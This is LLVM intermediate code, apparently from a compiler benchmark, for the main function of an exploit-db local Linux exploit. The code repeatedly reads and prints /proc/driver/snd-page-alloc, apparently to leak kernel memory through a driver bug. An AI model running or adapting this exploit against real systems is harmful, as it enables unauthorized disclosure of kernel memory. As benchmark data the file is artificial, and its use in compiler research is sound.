; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_30605.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_30605.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [28 x i8] c"/proc/driver/snd-page-alloc\00", align 1
@O_RDONLY = common dso_local global i32 0, align 4
@_SOME_NUM = common dso_local global i64 0, align 8
@.str.1 = private unnamed_addr constant [3 x i8] c"%c\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca [2 x i8], align 1
  %4 = alloca i32, align 4
  store i32 0, i32* %1, align 4
  %5 = load i32, i32* @O_RDONLY, align 4
  %6 = call i32 @open(i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str, i64 0, i64 0), i32 %5)
  store i32 %6, i32* %4, align 4
  store i32 0, i32* %2, align 4
  br label %7

7:                                                ; preds = %29, %0
  %8 = load i32, i32* %2, align 4
  %9 = load i64, i64* @_SOME_NUM, align 8
  %10 = trunc i64 %9 to i32
  %11 = icmp ult i32 %8, %10
  br i1 %11, label %12, label %32

12:                                               ; preds = %7
  %13 = getelementptr inbounds [2 x i8], [2 x i8]* %3, i64 0, i64 0
  %14 = call i32 @memset(i8* %13, i32 0, i32 2)
  %15 = load i32, i32* %4, align 4
  %16 = getelementptr inbounds [2 x i8], [2 x i8]* %3, i64 0, i64 0
  %17 = call i32 @read(i32 %15, i8* %16, i32 1)
  %18 = icmp ne i32 %17, 0
  br i1 %18, label %24, label %19

19:                                               ; preds = %12
  %20 = load i32, i32* %4, align 4
  %21 = call i32 @close(i32 %20)
  %22 = load i32, i32* @O_RDONLY, align 4
  %23 = call i32 @open(i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str, i64 0, i64 0), i32 %22)
  store i32 %23, i32* %4, align 4
  br label %28

24:                                               ; preds = %12
  %25 = getelementptr inbounds [2 x i8], [2 x i8]* %3, i64 0, i64 0
  %26 = load i8, i8* %25, align 1
  %27 = call i32 @printf(i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.1, i64 0, i64 0), i8 signext %26)
  br label %28

28:                                               ; preds = %24, %19
  br label %29

29:                                               ; preds = %28
  %30 = load i32, i32* %2, align 4
  %31 = add i32 %30, 1
  store i32 %31, i32* %2, align 4
  br label %7

32:                                               ; preds = %7
  %33 = load i32, i32* %1, align 4
  ret i32 %33
}

declare dso_local i32 @open(i8*, i32) #1

declare dso_local i32 @memset(i8*, i32, i32) #1

declare dso_local i32 @read(i32, i8*, i32) #1

declare dso_local i32 @close(i32) #1

declare dso_local i32 @printf(i8*, i8 signext) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
